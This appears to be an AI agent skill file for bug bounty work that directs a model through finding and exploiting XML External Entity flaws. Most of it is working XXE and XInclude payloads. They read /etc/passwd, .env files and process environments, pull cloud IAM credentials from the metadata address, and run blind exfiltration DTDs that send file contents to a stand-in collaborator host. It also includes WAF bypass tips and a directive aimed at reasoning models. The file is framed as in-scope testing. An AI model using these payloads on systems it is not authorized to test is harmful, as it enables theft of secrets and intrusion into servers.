---
name: xxe-dtd-hunter
description: Systematically hunt for XML External Entity (XXE), external DTD, parameter entity, XInclude, and XML parser misconfiguration vulnerabilities across file upload, API, SOAP, SAML, SVG, Office document, and backend XML processing surfaces. Covers parser fingerprinting, safe capability checks, blind OOB confirmation, local file read, SSRF pivoting, XInclude fallback, compressed archive and content-type smuggling routes, and DTD-based exfiltration. Use this skill whenever a target accepts XML directly or indirectly, parses SVG/DOCX/XLSX/PDF metadata, exposes SOAP/SAML endpoints, consumes RSS/Atom feeds, handles mobile app plist/XML, or transforms user-controlled structured documents server-side. Trigger on phrases like "xxe", "dtd", "external entity", "xml parser", "test xml upload", "soap", "saml", "svg upload", or when recon reveals XML content-types, SOAP actions, SAML flows, XML libraries, upload/import features, or endpoints returning XML errors.
---

# XXE and DTD Hunter Skill

You are hunting for XML External Entity issues and adjacent XML parser exploitation paths. Your goal is to identify XML parsing surfaces, confirm whether the parser resolves entities or includes external resources, then escalate safely to the strongest valid impact: local file read, blind exfiltration, SSRF to internal services, cloud metadata access, or trusted backend request forgery. Modern targets often disable classic external entities but still expose XInclude, external DTD fetches, SVG/XML metadata parsing, or archive-driven XML parsing through DOCX/XLSX/SVG importers. Hunt broadly across all XML entry points.

Run all phases in order. Phase 1 maps XML-capable surfaces before payloads. Phase 2 fingerprints parser behavior with low-risk probes. Phase 3 escalates through XXE, DTD, parameter entities, and XInclude. Phase 4 chains to impact. Phase 5 documents the PoC cleanly.

> **THINKING LLM DIRECTIVE — MAXIMUM EFFORT REQUIRED**
> If you are a reasoning/thinking model (o1, o3, Claude with extended thinking, Gemini with thinking, DeepSeek-R1, QwQ, or any model with a dedicated reasoning/thinking phase): **activate maximum thinking budget for this skill**. XXE validation is easy to misjudge because parser behavior differs across libraries, content-types, wrappers, upload workflows, and background processors. You must reason carefully about which parser path is actually in play, whether the result proves entity expansion versus generic XML acceptance, and which escalation chain is safest and strongest. Do not shortcut phase transitions.

---

## Prerequisites

- Burp Suite intercepting all traffic
- Collaborator / Interactsh / attacker-controlled DNS+HTTP endpoint ready for OOB confirmation
- Two accounts if testing stored XML processing surfaces
- All assets confirmed IN SCOPE via `/scope-checker`

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/xxe
```

---

## Phase 1 — Surface Mapping

### Step 1.1 — Identify Direct XML Surfaces

Prioritize all endpoints that explicitly accept XML or process XML-backed formats.

| Priority | Surface | Why |
|---|---|---|
| **Critical** | SOAP APIs | XML parsers, complex entity handling, backend trust |
| **Critical** | SAML / federation endpoints | Signed XML, parser differentials, relay workflows |
| **Critical** | File import (SVG, DOCX, XLSX, ODT) | Indirect XML parsing through document handlers |
| **High** | Mobile plist / app config upload | XML parsers often unsafe |
| **High** | RSS/Atom/feed import | External fetch plus XML parsing |
| **High** | PDF or image metadata extraction | SVG/XML-backed metadata parsers |
| **Medium** | Generic API accepting `application/xml` or `text/xml` | Direct parser exposure |
| **Medium** | Office template / invoice / report import | Archive unpacking then XML parsing |
| **Low** | Endpoint returning XML errors | Possible parser path nearby |

```bash
# Search recon output for XML-related hints
grep -RinE '(xml|soap|wsdl|saml|svg|rss|atom|plist|docx|xlsx|odt|office|import|upload|feed|transform)' \
  $TARGET_DIR/recon 2>/dev/null | sort -u > $TARGET_DIR/recon/xxe/candidate-surfaces.txt

# Search for XML content-types and parser hints in saved responses/notes
grep -RinE '(application/xml|text/xml|soap+xml|<!DOCTYPE|XML parser|SAXParseException|libxml|xerces|expat|DocumentBuilderFactory|XXE)' \
  $TARGET_DIR 2>/dev/null | sort -u > $TARGET_DIR/recon/xxe/parser-hints.txt
```

### Step 1.2 — Identify Indirect XML Formats

XXE often hides behind uploads and document processing. Treat these as XML until disproven:

- SVG
- DOCX / XLSX / PPTX / ODT / ODS / ODP
- Android manifests / mobile XML config files
- SAMLResponse / SAMLRequest
- SOAP envelopes
- RSS/Atom imports
- XML-based configuration import/export

```bash
cat > $TARGET_DIR/recon/xxe/xml-formats-checklist.txt << 'EOF'
[ ] SVG upload / avatar / logo / image processing
[ ] DOCX/XLSX/PPTX import or preview
[ ] SOAP/WSDL endpoints
[ ] SAML login/logout/assertion consumers
[ ] RSS/Atom/feed importers
[ ] application/xml or text/xml APIs
[ ] XML config import/export
[ ] Mobile plist/XML processing
EOF
```

---

## Phase 2 — Parser Fingerprinting

Do not jump to `/etc/passwd` first. Confirm parser behavior safely and determine whether entities, external fetches, or XInclude are supported.

### Step 2.1 — Well-Formedness and Error Behavior

```xml
<?xml version="1.0"?>
<root><a>test</a></root>
```

Observe:
- Does the endpoint accept XML at all?
- Does it echo parse errors?
- Does it name a parser/library (`libxml`, `xerces`, `SAXParseException`, `.NET XmlReader`)?
- Is XML only accepted for specific content-types or only inside uploads?

### Step 2.2 — Internal Entity Expansion Check

Use a safe internal entity first. This proves entity handling without any external interaction.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test "XXEWORKS">
]>
<root><name>&test;</name></root>
```

Interpretation:
- `XXEWORKS` reflected or processed = parser expands internal entities
- Parse error on DOCTYPE = DTD disabled or blocked
- Literal `&test;` = entity expansion not occurring in that context

### Step 2.3 — External DTD / OOB Fetch Check

Use a collaborator domain for low-risk OOB confirmation before file reads.

```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "https://YOUR-COLLAB-DOMAIN/xxe.dtd">
<root><a>1</a></root>
```

If the target fetches the DTD, you have confirmed outbound external resource resolution. That is a strong signal even if response content is not reflected.

### Step 2.4 — Parameter Entity Capability Check

Parameter entities are crucial for external DTD exfiltration.

`https://YOUR-COLLAB-DOMAIN/xxe.dtd`
```dtd
<!ENTITY % ping "PINGOK">
```

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "https://YOUR-COLLAB-DOMAIN/xxe.dtd">
<root>%ping;</root>
```

If the target fetches the DTD, but the `%ping;` behavior is unclear, move to blind exfil patterns in Phase 3.

### Step 2.5 — XInclude Fallback

If DOCTYPE is blocked, test XInclude — many parsers disable entities but still process includes.

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/hostname" parse="text"/>
</root>
```

If XInclude content appears in the response, you have an XXE-adjacent file read even without DOCTYPE support.

---

## Phase 3 — Exploitation Paths

### Path A — Classic Local File Read

Use only after entity expansion or external fetch capability is confirmed.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

Windows fallback:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>
```

Additional safe files:
- `file:///etc/hostname`
- `file:///proc/self/environ`
- `file:///app/config.yml`
- `file:///var/www/.env`
- `file:///c:/inetpub/wwwroot/web.config`

### Path B — Blind External DTD Exfiltration

Attacker-hosted DTD:
```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-COLLAB-DOMAIN/leak?d=%file;'>">
%eval;
%exfil;
```

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "https://YOUR-COLLAB-DOMAIN/evil.dtd">
<root>1</root>
```

Use `hostname` first, then move to `/etc/passwd`, `.env`, or cloud/metadata files only if needed for impact.

### Path C — SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<root><data>&xxe;</data></root>
```

Escalation targets:
- `http://127.0.0.1:80/`
- `http://localhost:8080/actuator`
- `http://169.254.169.254/latest/meta-data/`
- Internal admin panels, Redis, Solr, Elasticsearch, Jenkins, Consul if in scope and safely testable

Use collaborator-based SSRF confirmation when direct reflection is absent.

### Path D — XInclude File Read

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

If the endpoint inserts XML fragments into a larger document, try embedding the XInclude payload inside a nested field or document body.

### Path E — SVG / File Upload XXE

Minimal SVG probe:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Test upload, thumbnail generation, metadata extraction, preview rendering, PDF conversion, and downstream reuse. Stored processing is common.

### Path F — DOCX / XLSX / ODT Archive Route

Office formats are ZIP containers with XML inside. Replace a safe XML component with an XXE payload and re-zip.

High-value internal files to modify:
- `word/document.xml`
- `word/_rels/document.xml.rels`
- `xl/sharedStrings.xml`
- `content.xml`

If the app previews, indexes, converts, or imports the document, the XML parser may execute your DTD or XInclude payloads in the background.

### Path G — SOAP / SAML Specific Payloads

SOAP envelope example:
```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <check>&xxe;</check>
  </soap:Body>
</soap:Envelope>
```

SAML note:
- Test only around unsigned or attacker-controlled XML handling points such as preprocessing, debug endpoints, import utilities, metadata consumers, or parser differentials before signature validation.
- Do not assume the signed assertion consumer itself is trivially injectable.

---

## Phase 4 — Impact Chains

### Step 4.1 — Local File Read to Secret Extraction

Once file read is confirmed, prioritize secrets over generic files:

Linux:
- `/proc/self/environ`
- `/app/.env`
- `/var/www/.env`
- `/srv/app/config/*`
- framework secrets, API keys, DB connection strings

Windows:
- `c:/inetpub/wwwroot/web.config`
- app config files, connection strings, machine keys where applicable

### Step 4.2 — Cloud Metadata Access

AWS example:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
```

If metadata is reachable, enumerate only enough to prove impact. Avoid pulling more than needed.

### Step 4.3 — Internal Service Discovery via OOB SSRF

Host a collaborator and use external DTD or direct entities to request internal URLs. Record which targets respond differently, but keep scans minimal and hypothesis-driven.

Examples:
- local admin UIs
- actuator endpoints
- Elasticsearch / Solr / Prometheus
- service mesh metadata pages
- internal-only webhooks

### Step 4.4 — Stored / Background Parsing Impact

For upload/import workflows, prove whether parsing happens asynchronously:
- upload SVG/DOCX/XLSX with collaborator DTD
- wait for preview, indexing, antivirus, OCR, or conversion jobs
- record delayed DNS/HTTP callbacks

Background XXE with OOB confirmation is still a valid finding.

---

## Phase 5 — PoC Documentation

```bash
cat >> $TARGET_DIR/findings/xxe-$(date +%Y%m%d-%H%M).md << 'EOF'
## XXE / DTD Finding

**URL / feature:** [exact endpoint or workflow]
**Method:** [POST/PUT/upload/etc]
**Content-Type / format:** [application/xml, SVG upload, DOCX import, SOAP, etc]
**Parser behavior:** [internal entity expansion / external DTD fetch / XInclude / blind OOB only]
**Payload used:** [exact XML or DTD]
**Impact proven:** [file read / SSRF / cloud metadata / blind exfil / stored background processing]
**Evidence:** [response excerpt or collaborator hit]

**Request:**
```
[full HTTP request or upload details]
```

**Response / OOB evidence:**
```
[relevant excerpt]
```
EOF
```

Document the smallest payload that proves the issue. Include timing if background processing was involved.

---

## Blind XXE Quick Pack

Use these when no response reflection exists.

### OOB DTD fetch confirmation
```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "https://YOUR-COLLAB-DOMAIN/xxe.dtd">
<root>1</root>
```

### OOB file exfil via DTD
`evil.dtd`
```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'https://YOUR-COLLAB-DOMAIN/?d=%file;'>">
%all;
%send;
```

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "https://YOUR-COLLAB-DOMAIN/evil.dtd">
<root/>
```

### Background upload callback
- embed collaborator DTD in SVG or office XML part
- upload through import/preview pipeline
- monitor delayed hits for several minutes

---

## Content-Type and Wrapper Bypasses

If direct `application/xml` is blocked, try alternate entry points:

- `text/xml`
- `application/soap+xml`
- multipart file upload containing XML/SVG/DOCX/XLSX
- JSON wrapper with XML string field if backend transforms it
- GraphQL mutation accepting SVG/XML attachments or base64 documents
- compressed archive import with XML inside

If WAF blocks `<!DOCTYPE`, attempt:
- lowercase/uppercase variations where tolerated
- injecting XML through file upload instead of direct request body
- XInclude instead of DOCTYPE
- office/archive route instead of direct XML route

---

## Severity Reference

| Finding | Severity |
|---|---|
| XXE to cloud metadata / IAM creds / high-value internal SSRF | Critical |
| XXE with arbitrary local file read of secrets/config | High |
| XXE with blind OOB exfil of local files | High |
| XXE with confirmed internal SSRF only | High or Medium depending on reach |
| XInclude-only local file read | High |
| External DTD fetch only, no file read or SSRF proved | Medium |
| Internal entity expansion only, no external impact | Low or Medium |
| XML accepted but no entity/include behavior | Informational |

---

## Guiding Principles

- **Internal entity first, external entity second.** Prove parser behavior safely before escalating.
- **OOB confirmation is enough.** Blind XXE via DNS/HTTP callbacks is valid if the payload and callback correlation are tight.
- **XInclude matters.** Many targets block DOCTYPE but still allow file inclusion via XInclude.
- **Uploads are often the real XML surface.** SVG, DOCX, XLSX, and ODT frequently reach vulnerable XML parsers indirectly.
- **Do not overcollect secrets.** Read the minimum necessary file content to prove impact.
- **SSRF via XXE is still XXE.** If local file read is blocked but internal fetch is possible, document the SSRF chain clearly.
- **Run `/triager` before submitting.** External DTD fetch alone may be downgraded unless you chain it to file read, SSRF, or exfiltration.
